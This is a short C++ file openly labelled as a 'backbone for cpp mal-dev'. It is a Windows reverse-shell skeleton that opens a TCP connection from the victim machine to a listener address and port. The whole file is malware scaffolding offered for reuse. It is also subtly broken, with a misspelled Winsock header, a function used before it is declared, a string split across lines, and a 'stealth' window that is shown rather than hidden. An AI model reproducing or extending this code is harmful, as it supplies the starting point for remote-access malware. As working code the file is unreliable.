//a very simple backbone for cpp mal-dev 
#include <winsocks2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <iostream>
#pragma comment(lib,"Ws2_32.lib")
#define DEFAULT_BUFFER_LENGTH 1024

int main()
{
HWND stealth;
AllocConsole();
stealth= FindWindowA("ConsoleWindowClass" ,NULL);
ShowWindow(stealth,SW_SHOWNORMAL);
RevShell();
return 0 ;
}


void RevShell()
{
WSADATA wsaver;
WSAStartup( MAKEWORD( 2 , 2), &wsaver);
SOCKET tcpsock = socket
(AF_INET,SOCK_STREAM,IPPROTO_TCP);
sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = inet_addr( "127.0.0.1" ); //ip of listener
addr.sin_port = htons ( 8080);
if( connect (tcpsock, (SOCKADDR*)&addr, sizeof
(addr))==SOCKET_ERROR) {
closesocket(tcpsock);
WSACleanup();
exit(0 );
}
else {
std:: cout << "[+] Connected. Hit
<Enter> to disconnect..." << std::endl;
std::cin. get();
}
closesocket (tcpsock);
WSACleanup();
exit( 0 );
}
